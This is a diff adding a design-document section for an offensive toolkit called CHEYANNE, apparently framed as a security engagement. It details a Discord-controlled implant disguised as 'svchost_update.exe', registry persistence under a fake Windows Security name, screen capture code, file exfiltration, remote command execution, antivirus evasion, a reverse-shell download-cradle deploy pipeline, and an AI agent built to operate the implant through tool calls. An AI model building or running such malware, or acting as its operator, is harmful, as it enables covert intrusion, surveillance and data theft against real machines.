@@ -473,3 +473,183 @@ def monitor_canary(vector_id, timeout=300, interval=5):
 ```
 
 **Why it matters:** The pre-deploy scan prevents deploying a binary that Defender will immediately quarantine. If a binary comes back `DETECTED`, the operator is told to run `mutate.py` first. The profile system means the same deploy script works across different targets without modification — constraints like "admin is PIN-locked, no UAC bypass possible" are baked into the profile rather than discovered mid-operation. Evidence collection produces a JSON report with timestamps, scan results, and canary content — structured data for the CSEC engagement write-up.
+
+---
+
+## 8. CHEYANNE — Discord C2 + AI Operator
+
+CHEYANNE is the fork of VADER that adds Discord-based C2 infrastructure and an AI-powered operator agent. The naming is permanent and sacred.
+
+### 8.1 Discord Implant — `agent/discord_implant.py`
+
+**Purpose:** Python-based implant deployed to target via PyInstaller. Communicates over Discord (webhook for upload, bot token for command polling). Compiles to `svchost_update.exe` (~9.4MB).
+
+**Architecture:**
+```
+Target Machine                          Discord                         Operator
+┌─────────────────┐                   ┌──────────┐                 ┌────────────────┐
+│ discord_implant  │ ── heartbeat ──> │  #c2     │ <── poll ────  │ cheyanne_ops   │
+│                  │ ── recon ──────> │ channel  │ ── command ──> │ cheyanne_agent │
+│                  │ ── screenshot ─> │          │                │ vader_menu     │
+│                  │ <── commands ─── │          │                │                │
+└─────────────────┘                   └──────────┘                 └────────────────┘
+```
+
+**Key techniques:**
+
+- **Session ID:** 8-char UUID4 prefix, generated on implant startup. Tracks individual implant instances across restarts.
+- **Heartbeat:** JSON `{"type":"heartbeat","session":"XXXXXXXX","hostname":"NAME"}` posted to webhook every 60s.
+- **Command polling:** Bot token reads last N messages from channel. Matches `{"type":"cmd","session":"SESSION_ID","command":"..."}` against own session ID.
+- **Screenshot (GDI):** Uses ctypes to call Win32 GDI — `GetDC(0)`, `CreateCompatibleDC`, `CreateCompatibleBitmap`, `BitBlt`. Captures full screen as BMP, uploads to Discord as file attachment (<8MB).
+- **Persistence:** `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityHealth` registry key.
+- **Compilation:** `pyinstaller --onefile --noconsole discord_implant.py` → `dist_py/svchost_update.exe`.
+
+```python
+# GDI screenshot capture — no PIL, no external libs, pure ctypes
+user32 = ctypes.windll.user32
+gdi32 = ctypes.windll.gdi32
+width = user32.GetSystemMetrics(0)   # SM_CXSCREEN
+height = user32.GetSystemMetrics(1)  # SM_CYSCREEN
+hdc_screen = user32.GetDC(0)
+hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
+hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
+gdi32.SelectObject(hdc_mem, hbmp)
+gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, 0x00CC0020)  # SRCCOPY
+# Write BMP header + pixel data to temp file, upload via webhook multipart
+```
+
+### 8.2 Operations Module — `cheyanne_ops.py`
+
+**Purpose:** Programmatic Discord C2 API layer. Used by the menu, AI agent, and automation scripts. No Hermes/bot framework needed — talks directly to Discord REST API.
+
+**Functions (low-level):**
+| Function | What It Does |
+|----------|-------------|
+| `_parse_implant_config()` | Reads `WEBHOOK_URL`, `BOT_TOKEN`, `CHANNEL_ID` from `agent/discord_implant.py` source |
+| `_post_webhook(content)` | POST JSON to Discord webhook |
+| `_read_channel(limit)` | GET last N messages from channel via Bot token |
+| `send_command(session_id, cmd)` | Post JSON command for specific session |
+| `get_sessions()` | Parse heartbeat/recon messages → active session map |
+| `poll_output(session_id, timeout)` | Wait for `type:output` response from target |
+| `poll_attachment(timeout)` | Wait for file attachment (screenshot, exfil) |
+| `download_url(url, path)` | Download Discord CDN attachment to local file |
+| `convert_bmp_to_png(bmp_path)` | PowerShell .NET System.Drawing conversion |
+
+**High-level ops (menu + agent):**
+| Function | Operation |
+|----------|-----------|
+| `op_sessions()` | List all active sessions with formatted table |
+| `op_screenshot(session_id)` | Send SCREENSHOT → poll attachment → download → convert → open |
+| `op_browse(session_id, path)` | Send `dir /b` command → poll text output |
+| `op_exfil(session_id, remote_path)` | Send UPLOAD command → poll file attachment → save locally |
+| `op_upload(session_id, local_path, remote_path)` | Spin HTTP server → send DOWNLOAD command → target pulls file |
+| `op_recon(session_id)` | Send RECON → poll full system enumeration |
+| `op_run_cmd(session_id, cmd)` | Send arbitrary shell command → poll output |
+
+**Config parsing:** Reads credentials directly from the implant Python source — no separate config file needed. Falls back gracefully if implant source missing.
+
+### 8.3 AI Agent (HANDLER) — `cheyanne_agent.py`
+
+**Purpose:** Natural language C2 operator. Talk to it like a human, it calls tools automatically. Dual backend: local Ollama or Claude API.
+
+**Architecture:**
+```
+Operator types: "take a screenshot of radon"
+        │
+        ▼
+   ┌─────────────┐
+   │   HANDLER    │
+   │  LLM Backend │ ← system prompt with full architecture knowledge
+   │  (Ollama or  │
+   │   Claude)    │
+   └──────┬──────┘
+          │ generates <tool> blocks
+          ▼
+   ┌─────────────┐
+   │ Tool Parser  │ ← regex extracts JSON from <tool>...</tool> tags
+   └──────┬──────┘
+          │ dispatches
+          ▼
+   ┌─────────────┐
+   │  exec_tool() │ → cheyanne_ops.py functions
+   └─────────────┘
+```
+
+**Tool calling approach:** Prompt-based, not native API. The system prompt defines a `<tool>` XML format, and the response parser extracts JSON from these blocks. This works with ANY model regardless of native tool-call support.
+
+```python
+# Example model output:
+# "Let me check the sessions. <tool>{"name":"list_sessions","args":{}}</tool>"
+
+def _parse_tools(self, text):
+    tool_blocks = re.findall(r'<tool>\s*(.*?)\s*</tool>', text, re.DOTALL)
+    calls = []
+    for block in tool_blocks:
+        data = json.loads(block)
+        calls.append((data.get("name", ""), data.get("args", {})))
+    clean = re.sub(r'<tool>.*?</tool>', '', text, flags=re.DOTALL).strip()
+    return calls, clean
+```
+
+**8 available tools:**
+| Tool | Maps To | What It Does |
+|------|---------|-------------|
+| `list_sessions` | `op_sessions()` | List active Discord implant sessions |
+| `screenshot` | `op_screenshot()` | Capture target screen via GDI → Discord |
+| `browse_files` | `op_browse()` | List directory contents on target |
+| `exfil_file` | `op_exfil()` | Pull file from target to operator |
+| `upload_file` | `op_upload()` | Push file to target via HTTP staging |
+| `run_command` | `op_run_cmd()` | Execute shell command on target |
+| `recon` | `op_recon()` | Full system enumeration |
+| `local_command` | `subprocess.run()` | Run command on operator's machine |
+
+**Ollama auto-detection:** Tries `127.0.0.1:11434`, `192.168.1.92:11434`, `localhost:11434` — picks first that responds.
+
+**Multi-round execution:** Up to 3 tool-call rounds per user message. Model calls tools → results fed back → model analyzes → may call more tools → final text response.
+
+### 8.4 Auto-Deploy Pipeline — `auto_screenshot_test.py`
+
+**Purpose:** Automated 7-step pipeline: compile → scan → serve → deploy → discover session → screenshot → convert.
+
+**Steps:**
+1. PyInstaller compile `discord_implant.py` → `svchost_update.exe`
+2. Defender scan the output
+3. HTTP server on `:8890` serving the exe
+4. TCP listener on `:4443` for Radon shell, sends PowerShell download cradle
+5. Discover implant session ID from Discord heartbeat/recon messages
+6. Send SCREENSHOT command, poll for BMP attachment
+7. Download BMP, convert to PNG via .NET, open in explorer
+
+### 8.5 Menu Structure — `vader_menu.py`
+
+The menu is organized into operational phases:
+
+```
+╔═══════════════════════════════════════════════════════╗
+║             C H E Y A N N E                           ║
+╚═══════════════════════════════════════════════════════╝
+
+  PHASE 1 — BUILD
+  [F] Fresh Build          [1] Compile All    [2] Scan All
+  [4] Mutate Keys          [6] Key Status
+
+  PHASE 2 — STEALTH
+  [3] Dark Room Test       [7] Build Cloak    [8] Test Cloak
+  [9] Activate Cloak
+
+  PHASE 3 — DEPLOY
+  [D] C2 Shell (TCP+Discord)
+  [B] Build Discord Implant (PyInstaller)
+  [A] Auto Deploy (compile → serve → deploy → screenshot)
+
+  PHASE 4 — OPERATE
+  [S] Sessions             [T] Screenshot     [L] Browse Files
+  [E] Exfil File           [U] Upload File    [N] Recon
+
+  ── TOOLKIT ──
+  [H] HANDLER (AI Operator)
+  [G] Ghost Encoder        [5] Pentest Chain
+  [W] Web Dashboard        [X] Image Convert
+```
+
+Phase 4 OPERATE imports from `cheyanne_ops.py` with graceful fallback (`HAS_OPS` flag). If the module is missing, Phase 4 options print a warning instead of crashing.
